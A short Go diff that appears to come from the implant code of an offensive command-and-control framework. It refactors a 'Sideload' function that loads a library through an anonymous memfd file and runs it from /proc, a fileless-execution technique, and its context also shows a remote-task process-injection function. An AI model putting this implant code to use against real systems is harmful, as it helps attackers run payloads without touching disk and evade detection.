@@ -31,6 +31,8 @@ import (
 
 	//{{if .Config.Debug}}
 	"log"
+
+	"golang.org/x/sys/unix"
 	//{{end}}
 )
 
@@ -58,25 +60,15 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 // Sideload - Side load a library and return its output
 func Sideload(procName string, data []byte, args string, kill bool) (string, error) {
 	var (
-		nrMemfdCreate int
-		stdOut        bytes.Buffer
-		stdErr        bytes.Buffer
-		wg            sync.WaitGroup
+		stdOut bytes.Buffer
+		stdErr bytes.Buffer
+		wg     sync.WaitGroup
 	)
 	memfdName := randomString(8)
-	memfd, err := syscall.BytePtrFromString(memfdName)
+	fd, err := unix.MemfdCreate(memfdName, unix.MFD_ALLOW_SEALING)
 	if err != nil {
-		//{{if .Config.Debug}}
-		log.Printf("Error during conversion: %s\n", err)
-		//{{end}}
 		return "", err
 	}
-	if runtime.GOARCH == "386" {
-		nrMemfdCreate = 356
-	} else {
-		nrMemfdCreate = 319
-	}
-	fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), uintptr(unsafe.Pointer(memfd)), 1, 0)
 	pid := os.Getpid()
 	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)
 	err = ioutil.WriteFile(fdPath, data, 0755)
